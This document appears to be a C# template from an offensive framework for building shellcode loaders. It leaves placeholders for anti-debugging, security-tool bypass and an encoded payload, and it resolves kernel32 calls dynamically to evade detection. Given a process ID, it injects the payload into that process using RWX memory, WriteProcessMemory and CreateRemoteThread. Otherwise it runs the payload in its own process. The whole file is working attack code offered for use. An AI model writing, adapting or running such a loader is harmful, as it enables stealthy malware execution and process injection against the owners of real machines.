using System;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
//####USING####


namespace Inceptor
{

    //####CODE####

    public static class SatsuiRyu
    {

        public static void Main(string[] args)
        {
            //####DELAY####

            //####ANTIDEBUG####

            //####BYPASS####

            var encoded = ####SHELLCODE####;

            //####CALL####

            DLL k32 = new DLL("kernel32.dll");

            if (args.Length >= 1)
            {
                var openProcess = k32.ChaseFunction("OpenProcess") as OpenProcess;
                var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[0]));

                var virtualAllocEx = k32.ChaseFunction("VirtualAllocEx") as VirtualAllocEx;
                var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (UInt32)decoded.Length, 0x3000, 0x40);

                UInt32 bytesWritten = 0;
                var writeProcessMemory = k32.ChaseFunction("WriteProcessMemory") as WriteProcessMemory;
                writeProcessMemory(hProcess, alloc, decoded, (UInt32)decoded.Length, out bytesWritten);

                var createRemoteThread = k32.ChaseFunction("CreateRemoteThread") as CreateRemoteThread;
                createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
            }
            else
            {
                var virtualAlloc = (VirtualAlloc)k32.ChaseFunction("VirtualAlloc");
                k32.CheckNull(virtualAlloc, "VirtualAlloc");

                var alloc = virtualAlloc(IntPtr.Zero, (UInt32)decoded.Length, 0x3000, 0x40);

                Marshal.Copy(decoded, 0, (IntPtr)(alloc), decoded.Length);

                UInt32 threadId;
                var createThread = k32.ChaseFunction("CreateThread") as CreateThread;
                IntPtr hThread = createThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
                k32.CheckNullPtr(hThread, "CreateThread");

                var waitForSingleObject = k32.ChaseFunction("WaitForSingleObject") as WaitForSingleObject;
                waitForSingleObject(hThread, 0xFFFFFFFF);

            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UInt32 lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out UInt32 lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 WaitForSingleObject(IntPtr hModule, UInt32 timeout);

        internal class DLL
        {

            public string name;

            public object ChaseFunction(string fname)
            {
                var type = (from assembly in AppDomain.CurrentDomain.GetAssemblies()
                            from t in assembly.GetTypes()
                            where t.Name == fname
                            select t).FirstOrDefault();
                this.CheckNull(type, fname + " not found");
                var p = DInvoke.DynamicInvoke.Generic.GetLibraryAddress(this.name, fname, true);
                this.CheckNullPtr(p, fname);
                var x = Marshal.GetDelegateForFunctionPointer(p, type);
                this.CheckNull(x, "GetDelegateForFunctionPointer");
                return x;
            }

            public DLL(string name)
            {
                this.name = name;
            }


            public void CheckNull(object test, string label) {
                if (test == null) {
                    Console.WriteLine("Error: {0} is null", label);
                    Environment.Exit(1);
                }
            }
            public void CheckNullPtr(IntPtr test, string label) {
                if (test == IntPtr.Zero) {
                    Console.WriteLine("Error: {0} is INtPtr.Zero", label);
                    Environment.Exit(1);
                }
            }

        }
    }
}